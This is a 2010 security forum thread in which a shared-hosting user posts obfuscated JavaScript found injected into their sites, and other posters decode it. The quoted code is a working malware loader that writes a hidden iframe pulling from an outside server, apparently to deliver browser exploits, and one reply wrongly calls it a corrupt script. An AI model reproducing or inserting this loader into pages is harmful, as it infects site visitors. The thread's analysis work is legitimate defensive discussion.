---
title: "Found strange javascript code on multiple domains on my shared host"
date: 2010-02-02
forum: Security
---

### Post by s0c0 on 2010-02-02
I found the following javascript on multiple domains on my shared hosting account.  I've removed any remnants I could find.  I just noticed this the other day.  I am definitely going to change my passwords, but I was wondering if anyone has seen anything like this before:

```

<script>c46d278='';r935ebef290=document;r935ebef290.write('<scr'+'ipt>function r4569f8(rf5689){return e'+c46d278+'val(rf5689); }</scr'+'ipt>');  function c461134c94r570039(r9fcf87c5e9){  var d5e7='';return (r4569f8('p'+d5e7+'arseInt')(r9fcf87c5e9,16));}function rcb3e7ac446d(r9e84868f){ function ra8e2732(){var rd81c7eb9a71=2;return rd81c7eb9a71;} var r12ae09a5cda='';r6791d='fromCh';r587192=String[r6791d+'arCode'];for(r8a86e310237=0;r8a86e310237<r9e84868f.length;r8a86e310237+=ra8e2732()){ r12ae09a5cda+=(r587192(c461134c94r570039(r9e84868f.substr(r8a86e310237,ra8e2732()))));}return r12ae09a5cda;} var r9f0e9628='3C7363726970743E69662821'+c46d278+'6D796961'+c46d278+'297B646F63756D656E742E777269746528756E65736361'+c46d278+'7065282027253363253639253636253732253631'+c46d278+'253664253635253230253665253631'+c46d278+'253664253635253364253633253334253336253230253733253732253633253364253237253638253734253734253730253361'+c46d278+'25326625326625373425363525373225363925373325373425366625373225363925366525363325326525363325366625366425326625373425373325326625363925366525326525363325363725363925336625363325366625363425363925366526253237253262253464253631'+c46d278+'253734253638253265253732253666253735253665253634253238253464253631'+c46d278+'253734253638253265253732253631'+c46d278+'253665253634253666253664253238253239253261'+c46d278+'253336253330253338253334253239253262253237253333253237253230253737253639253634253734253638253364253331'+c46d278+'253335253336253230253638253635253639253637253638253734253364253333253339253230253733253734253739253663253635253364253237253736253639253733253639253632253639253663253639253734253739253361'+c46d278+'253638253639253634253634253635253665253237253365253363253266253639253636253732253631'+c46d278+'2536642536352533652729293B7D7661'+c46d278+'72206D796961'+c46d278+'3D747275653B3C2F7363726970743E';r935ebef290.write(rcb3e7ac446d(r9f0e9628));</script><script>check_content()</script>

```

I know javascript, but I'm not devious like this.  It looks very nasty though.

---

### Post by The Cog on 2010-02-03
I think it ends up writing something like this into the document:

```
<iframe name=c46 src='http://teristorinc.com/ts/in.cgi?codin&'+Math.round(Math.random()*6084)+'3' width=156 height=39 style='visibility:hidden'></iframe>
```

---

### Post by unspawn on 2010-02-03
> **s0c0 said:**
> I've removed any remnants I could find.
What you did was *patch symptoms*, not *fix the cause*. You might be running vulnerable, unpatched software versions or there might be an infected website management client unknowingly tainting uploaded files or server configuration might be set too lax or anything else along those lines.

---

### Post by *Raz0r* on 2010-02-05
It doesn't look like a security vulnerability really but instead more like an outdated script with a file that might be corrupt.

---

### Post by The Cog on 2010-02-06
No it's a heavily obfuscated script, that loads a hidden iframe from another server. I presume that the server is a compromised one that serves browser busting malware. The script is up to no good, and should not be there.

---

